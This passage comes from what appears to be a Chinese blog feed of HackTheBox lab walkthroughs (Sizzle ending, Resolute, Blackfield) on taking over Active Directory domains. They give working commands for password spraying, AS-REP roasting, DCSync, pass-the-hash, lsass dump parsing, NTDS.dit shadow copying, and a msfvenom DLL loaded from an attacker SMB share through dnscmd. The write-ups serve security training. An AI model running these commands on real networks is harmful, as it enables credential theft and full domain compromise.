<code>openssl</code>创建<code>mrlky</code>的<code>CSR</code>和密钥</p><p><code>openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716141451172-153851049.png" alt="image-20240716141446345"></p><p>重复之前的操作最终会得到一个新的证书</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716141839775-1368628577.png" alt="image-20240716141836559"></p><p>这里为了跟之前的证书区分开来，就换了个名字<code>mrlkynew.cer</code>，但是不影响登录</p><p><code>evil-winrm -c mrlkynew.cer -k mrlky.key -i 10.10.10.103 -u mrlky -p Football#7 -S</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716142040045-2006970951.png" alt="image-20240716142036513"></p><p>登陆成功</p><p>现在登陆的是<code>mrlky.HTB</code>用户，在他的桌面上并没有我们想要的东西。通过查看用户发现，还有一个<code>mrlky</code>的用户，最后在<code>mrlky</code>的<code>Desktop</code>上找到<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716142441255-381007509.png" alt="image-20240716142438044"></p><h1>AD域提权</h1><h2 id="Python-Bloodhound信息搜集">Python-Bloodhound信息搜集</h2><p><code>bloodhound-python -c all -u mrlky -p Football#7 -d htb.local -ns 10.10.10.103</code></p><p>得到的文件拿<code>bloodhound</code>打开分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715192108385-865177832.png" alt="image-20240715192107875"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716143122067-946821219.png" alt="image-20240716143118655"></p><p>发现<code>mrlky</code>有<code>GetChangesALL</code>权限可以直接进行<code>dcsync</code>攻击</p><h2 id="DCSync攻击">DCSync攻击</h2><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py mrlky:Football#7@10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144053985-1944936331.png" alt="image-20240716144050521"></p><p>拿到<code>Administrator</code>的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267</span><br></pre></td></tr></table></figure><h2 id="PTH传递攻击登录管理员">PTH传递攻击登录管理员</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144324075-1639180140.png" alt="image-20240716144320564"></p><p>成功拿到管理员权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144519997-1994691611.png" alt="image-20240716144516769"></p><p>最后也是在<code>Desktop</code>上找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Sizzle</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Resolute</title>
    <link href="https://www.fomal.cc/posts/6134d881.html"/>
    <id>https://www.fomal.cc/posts/6134d881.html</id>
    <published>2024-07-12T06:30:34.000Z</published>
    <updated>2024-10-12T11:01:12.874Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.169</p><p>攻击机ip：10.10.14.28</p></blockquote><h1>知识点</h1><ul><li>密码喷洒</li><li>利用DnsAdmins提权</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p>拿<code>nmap</code>扫一下</p><p><code>nmap -sS -sV -sC 10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712152502867-231239340.png" alt="image-20240712152500615"></p><p>分析发现有<code>DNS</code>服务、<code>kerberos</code>服务、<code>ldap</code>服务、<code>smb</code>服务，域名为<code>megabank.local</code></p><h2 id="SMB">SMB</h2><p>简单测试一下</p><p><code>smbclient -L //10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712152804340-1683391527.png" alt="image-20240712152802524"></p><p>匿名登陆成功但是没什么有用的信息</p><h2 id="ldap">ldap</h2><p><code>ldapsearch -H ldap://10.10.10.169:389 -x -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712153256941-2017644621.png" alt="image-20240712153255680"></p><p>也没啥有用信息</p><h2 id="RPC">RPC</h2><p>利用RPC远程过程调用枚举用户</p><p><code>rpcclient -U &quot;&quot; -N 10.10.10.169</code></p><p>枚举用户</p><p><code>enumdomusers</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712153719898-11121245.png" alt="image-20240712153719000"></p><p>显示用户详细列表信息</p><p><code>querydispinfo</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712155153559-329641798.png" alt="image-20240712155152658"></p><p>找到用户名密码：<code>marko : Welcome123!</code></p><p>尝试<code>rpcclient</code>和<code>smbclient</code>登录</p><p><code>smbclient -U marko -L //10.10.10.169</code></p><p><code>rpcclient -U marko -N 10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712161106863-713337375.png" alt="image-20240712161105981"></p><p>都失败了。</p><h1>密码喷洒</h1><p>既然<code>marko</code>用户登录不上，不妨拿这个密码去试试其他的用户，利用<code>crackmapexec</code>工具尝试密码喷洒攻击</p><p>先将之前通过<code>rpcclient</code>的<code>enumdomusers</code>命令拿到的用户名列表保存为<code>users</code></p><p>写个<code>python</code>脚本将其提取到<code>users.txt</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开uusers.txt文件进行读取</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    lines = infile.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开user.txt文件进行写入</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># 使用正则表达式匹配user后面的用户名</span></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;user:\[(.*?)\]&#x27;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 将用户名写入user.txt文件中</span></span><br><span class="line">            outfile.write(username + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162109450-1203669142.png" alt="image-20240712162108457"></p><p>使用<code>crackmapexec</code>进行密码喷洒</p><p><code>crackmapexec smb 10.10.10.169 -u ./users.txt -p Welcome123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162354838-1404006531.png" alt="image-20240712162353688"></p><p>发现<code>melanie</code>用户可以登录，使用<code>evil-winrm</code>登录</p><p><code>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162935023-164823517.png" alt="image-20240712162933792"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712163206748-1443376353.png" alt="image-20240712163205922"></p><p>在<code>Desktop</code>上找到<code>user.txt</code></p><h1>AD域提权</h1><h2 id="BloodHound信息搜集">BloodHound信息搜集</h2><p>将<code>SharpHound.exe</code>传上去运行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712175809715-202073680.png" alt="image-20240712175808679"></p><p>将结果<code>zip</code>下载下来，拿<code>bloodhoun</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712181220147-1222680155.png" alt="image-20240712181218798"></p><p>点击<code>Find Shortest Paths to Domain Admins</code>后，发现当前用户没有什么明显利用的点，但是发现在这个域中还有一个<code>ryan</code>用户，但是不知道密码，只能从当前<code>melanie</code>用户入手了</p><h2 id="查看Powershell日志文件获得用户名密码">查看Powershell日志文件获得用户名密码</h2><p>查找可疑文件时，在<code>C:/</code>目录下运行<code>ls -force</code>命令后发现如下结果：<br><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712181552664-103691626.png" alt="image-20240712181551586"></p><p>其中<code>PSTranscripts</code>有点可疑，该英文直译是<code>PS传输脚本</code>，仔细查看一下这个目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182039819-759817632.png" alt="image-20240712182037742"></p><p>在<code>C:\PSTranscripts\20191203</code>目录下找到<code>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code>文件，该文件可能是<code>Powershell</code>的日志之类的文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182643667-1606404044.png" alt="image-20240712182642485"></p><p>这里貌似是<code>ryan</code>用户的用户名和密码，尝试登陆下</p><p><code>evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182823693-1043454332.png" alt="image-20240712182822459"></p><p>登录成功</p><h2 id="利用DnsAdmins提权">利用DnsAdmins提权</h2><p>在桌面发现<code>note.txt</code>文件，内容如下：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712183132981-1610553881.png" alt="image-20240712183131938"></p><p>翻译过来就是</p><blockquote><p>发送给团队的电子邮件：</p><p>- 由于更改冻结，任何系统更改（除了对管理员帐户的更改）都将在1分钟内自动恢复</p></blockquote><p>在查看<code>bloodhound</code>的过程中发现下面情况：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712191138799-215220281.png" alt="image-20240712191130338"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712191145783-1038194011.png" alt="image-20240712191143991"></p><p>发现<code>ryan</code>用户属于<code>contractors</code>组，而<code>contractors</code>组又属于<code>dnsadmins</code>组，所以<code>ryan</code>用户属于<code>dnsadmins</code>组</p><p>就可以利用 <code>DnsAdmins</code>权限进行<code>AD</code>域提权</p><blockquote><p><code>DNSAdmins</code>组的成员可以访问网络 <code>DNS</code> 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。</p><p>dnsadmins 组的成员可用于通过 <code>dll</code> 注入将权限提升到管理员。</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">参考链接</a></p></blockquote><p>首先使用<code>msf</code>生成<code>dll</code>文件，将<code>dll</code>文件传到机器上</p><p><code>msfvenom -p windows/x64/exec cmd='net user administrator abc123! /domain' -f dll &gt; evil.dll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714143409907-1507824470.png" alt="image-20240714143407217"></p><p>因为正常<code>upload</code>传文件会被杀掉，这里考虑使用<code>smb</code>传文件</p><p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714134946085-1345920374.png" alt="image-20240714134943265"></p><p>在靶机上的<code>ps</code>里头执行</p><p><code>cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.28\share\evil.dll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714135422509-753045836.png" alt="image-20240714135419626"></p><p>接着执行如下命令重启<code>dns</code>服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop dns</span><br><span class="line">sc.exe <span class="built_in">start</span> dns</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714140456936-991048758.png" alt="image-20240714140453914"></p><p>此时，之前利用<code>python</code>起的<code>smbserver</code>服务会收到回显</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714140731885-1692805194.png" alt="image-20240714140729094"></p><p>最后利用<code>psexec.py</code>登录，输入密码</p><p><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py megabank.local/administrator@10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714143554332-1195939730.png" alt="image-20240714143551441"></p><p>最后在<code>Administrator</code>的<code>Desktop</code>找到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714144241216-9787929.png" alt="image-20240714144237322"></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Resolute</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Blackfield</title>
    <link href="https://www.fomal.cc/posts/82db38f4.html"/>
    <id>https://www.fomal.cc/posts/82db38f4.html</id>
    <published>2024-07-09T11:30:53.000Z</published>
    <updated>2024-10-12T11:01:18.846Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.192</p><p>攻击机ip：10.10.14.12</p></blockquote><h1>知识点</h1><ul><li>AS-REP Roasting</li><li>Python版Bloodhound使用</li><li>ForceChangePassword权限滥用实现横向移动</li><li>利用Lsass内存捕获文件提取用户hash</li><li>利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升</li><li>使用wmiexec进行PTH</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709112314494-548401534.png" alt="image-20240709112312857"></p><p>有<code>DNS</code>服务，<code>kerberos</code>服务，<code>LDAP</code>服务，<code>SMB</code>服务，域名<code>BLACKFIELD.local</code></p><h2 id="SMB">SMB</h2><p>直接尝试一手匿名登录</p><p><code>smbclient -L \\10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710104225686-281558305.png" alt="image-20240710104224727"></p><p>发现得到一些共享资源，尝试获取<code>profiles$</code>资源</p><p><code>smbclient //10.10.10.192/profiles$</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710111357853-1171589590.png" alt="image-20240710111356614"></p><p>发现一些使用者的名称，将每条带名字的数据保存到<code>users.txt</code>中，写个脚本将其保存到<code>user.txt</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用正则表达式提取姓名部分</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^\s*(\S+)&#x27;</span>, re.MULTILINE)</span><br><span class="line">names = pattern.findall(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将提取的姓名保存到新文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        output_file.write(name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提取的数据已保存到 &#x27;user.txt&#x27; 文件中。&quot;</span>)</span><br></pre></td></tr></table></figure><p>这样就获得了一个基本的用户列表</p><h2 id="LDAP">LDAP</h2><p>利用<code>ldapsearch</code>搜索</p><p><code>ldapsearch -H ldap://10.10.10.192:389 -x -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710113255598-1728367252.png" alt="image-20240710113254757"></p><p>得到两个域名</p><blockquote><p><code>DomainDnsZones.blackfield.local</code></p><p><code>ForestDnsZones.blackfield.local</code></p></blockquote><h1>AS-REP Roasting</h1><p>拿到了用户名，这里又暴露了<code>kerberos</code>端口88。尝试一下<code>AS-REP Roasting</code>攻击</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -usersfile user.txt  -dc-ip 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710114412279-965573907.png" alt="image-20240710114411468"></p><p>拿到一个<code>support</code>用户的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:8e8fcfa24b77dd8ed4e22771a99640c3$937ed6b20ebfcdbc0a07e975d271f8a18d88e0dfc6b774da9184de540c6847c9adeb2b5615a2f99e06235064c420c621ae3b2bc0cf78ebe3047b7004d1dcfac74bc582fc68c3fa0cf0244920cfceab53cee3e91fc049bbef7efa1584041389ae19d317ab6bfb5c0df0eb4703fbe66367f12999d756d9400e971ab0b6d8993c267a606359303d2f4dfc54ae40b819c613e8e6281a91cec5d22aef09304a696cb9b43a4555ce0dbfe860a16bb83ea715eceabee93327ad337799f0f5153e91e924df1624e3458201312cd6a4bc1d4999dd9b0cc2a4ea3406f78836240ef70c1982911fd13e8f45c3c4f36c28781133df608f33d801</span><br></pre></td></tr></table></figure><p>使用<code>john</code>进行破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710114627581-651420839.png" alt="image-20240710114626394"></p><p>拿到用户名密码：<code>support : #00^BlackKnight</code></p><p>但是<code>evil-winrm</code>登陆不了，无法通过<code>BloodHound.exe</code>进行信息收集，但是可以使用<code>Python</code>版的<code>BloodHound</code>信息收集，实现了不需要登录即可完成信息收集的功能</p><h1>AD域渗透</h1><h2 id="Python版Bloodhound-信息搜集">Python版Bloodhound-信息搜集</h2><p>使用之前获得的用户和密码，通过<code>bloodhound</code>进行信息搜集</p><p><code>bloodhound-python -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710150153628-249598852.png" alt="image-20240710150152607"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710150205848-1098348644.png" alt="image-20240710150201795"></p><p>得到一些文件，导入<code>bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710152322259-467189056.png" alt="image-20240710152321163"></p><p>点击<code>First Degree Object Control</code>可以发现<code>support</code>用户与<code>audit2020</code>用户有<code>ForceChangePassword</code>关系</p><p>顾名思义，就是<code>support</code>用户可以修改<code>audit2020</code>用户的密码</p><h2 id="ForceChangePassword权限滥用实现横向移动">ForceChangePassword权限滥用实现横向移动</h2><p>尝试利用<code>rpcclient</code>修改<code>audit2020</code>用户的密码</p><p><code>rpcclient -U support --password='#00^BlackKnight' //10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710153321856-686397598.png" alt="image-20240710153321021"></p><p>修改密码</p><p><code>setuserinfo2 audit2020 23 'test'</code></p><p>其中<code>23</code>表示用户信息级别为设置用户密码的级别</p><p>当设置的新密码与密码策略不匹配时会返回，设置一个复杂度比较高的密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154020510-5395533.png" alt="image-20240710154019443"></p><p><code>setuserinfo2 audit2020 23 'abc123!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154643225-1445876917.png" alt="image-20240710154642384"></p><p>利用<code>crackmapexec</code>验证一下</p><p><code>crackmapexec smb 10.10.10.192 -u audit2020 -p 'abc123!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154816714-1157833350.png" alt="image-20240710154815763"></p><p>尝试通过<code>audit2020</code>用户去获得更多<code>smb</code>共享目录</p><p><code>smbmap -H 10.10.10.192 -u audit2020 -p 'abc123!'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710155251724-1886584129.png" alt="image-20240710155250411"></p><p>发现获得了<code>forensic</code>目录的访问权限</p><p><code>smbclient -U audit2020%'abc123!' //10.10.10.192/forensic</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710170746090-1201307298.png" alt="image-20240710170745364"></p><p>在<code>\commands_output\</code>目录下找到<code>domain_admins.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710170914171-1511595285.png" alt="image-20240710170913100"></p><p>将其<code>get</code>下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710171000940-1172109387.png" alt="image-20240710171000020"></p><p>发现疑似<code>admin</code>密码</p><h2 id="利用Lsass内存捕获文件提取用户hash">利用Lsass内存捕获文件提取用户hash</h2><p>在<code>\memory_analysis\</code>目录下发现 <code>lsass.zip</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710192250343-879219788.png" alt="image-20240710192247820"></p><p>该文件可能是对<code>LSASS</code>进程进行了内存捕获的结果，<code>LSASS</code>是<code>Windows</code>中处理身份验证和安全策略的系统服务。其内存空间中保存着各种身份验证的信息。我们将该文件下载并解压。</p><p><code>smbclient -U audit2020%'abc123!' //10.10.10.192/forensic -t 1000</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710203532417-712881982.png" alt="image-20240710203530888"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711113908563-1043657612.png" alt="image-20240711113903638"></p><p>得到一个<code>lsass.DMP</code>文件</p><p>使用<code>mimikatz</code>工具从内存转储中尝试提取用户的<code>hash</code>，在<code>Linux</code>中使用<code>Python</code>版的<code>Mimikatz</code>——<code>pypykatz</code></p><p><code>pypykatz lsa minidump lsass.DMP</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711140819814-250042491.png" alt="image-20240711140816038"></p><p>找到<code>svc_backup</code>用户的<code>hash</code>：<code>9658d1d1dcd9250115e2205d9f48400d</code></p><p>先尝试利用<code>svc_backup</code>用户名及其<code>hash</code>远程登录</p><p><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711143617732-359613996.png" alt="image-20240711143614075"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711150000424-813557009.png" alt="image-20240711145956639"></p><h2 id="利用SeBackupPrivilege权限进行NTDS-dit卷影拷贝实现权限提升">利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711164410787-733913997.png" alt="image-20240711164407072"></p><p>在之前的<code>bloodhound</code>信息搜集中搜索<code>svc_backup</code>，点击<code>First Degree Group Memberships</code>发现该用户属于<code>backup_operators</code>组的成员</p><p>拥有这个组权限的人可以通过<code>SEBackupPrivilege </code>权限进行提权，执行如下命令，确认是否具有该权限：</p><p><code>whoami /priv</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711170127115-1738419937.png" alt="image-20240711170123369"></p><p>发现我们有<code>SeBackupPrivilege </code>权限，就可以通过使用签名的二进制文件创建 <code>NTDS.dit</code> 的卷影副本来完成<code>diskshadow</code></p><p>首先上传并导入<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/Blackfield/SeBackupPrivilegeCmdLets.dll </span><br><span class="line"></span><br><span class="line">upload /root/htb/Machines/Blackfield/SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line"></span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711202225639-2048106759.png" alt="image-20240711202221083"></p><p>接着写入文件并通过<code>upload</code>上传</p><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">参考链接</a></p><p>但是这里要加一行来指定元数据文件的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # 添加的部分</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711202619203-1966588599.png" alt="image-20240711202615153"></p><p>执行<code>diskshadow </code>并使用脚本文件作为其输入</p><p><code>cmd /c diskshadow /s cmd.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711203325908-369933739.png" alt="image-20240711203321708"></p><p>将备份<code>ntds.dit</code>文件移动到当前文件夹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robocopy /b z:\windows\ntds\ .\ NTDS.dit</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711204452433-847416599.png" alt="image-20240711204448694"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711204526369-88572884.png" alt="image-20240711204522630"></p><p>从注册表中获取<code>system.hive</code>文件</p><p><code>reg save HKLM\SYSTEM .\system.hive</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711205054759-313412363.png" alt="image-20240711205050633"></p><p>可以看到，现在已经获得了<code>NTDS.dit</code>和<code>system.hive</code>，将这两个文件下载到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download ntds.dit</span><br><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>使用<code>secretsdump.py</code> 解析 <code>NTDS.dit</code></p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive local</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712141900243-2116055538.png" alt="image-20240712141859105"></p><p>拿到<code>administrator</code>的<code>hash</code></p><h2 id="使用wmiexec进行PTH">使用wmiexec进行PTH</h2><p>通过<code>wmiexec.py</code>通过<code>hash</code>来登录到管理员账户</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee blackfield.LOCAL/administrator@10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712142129871-935519493.png" alt="image-20240712142125899"></p><p>现在已经是管理员权限了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712142629505-762298768.png" alt="image-20240712142625352"></p><p>最后在<code>Administrator</code>的<code>Desktop</code>上找到<code>root.txt</code>以及<code>notes.txt</code></p>]]></content>
    
    
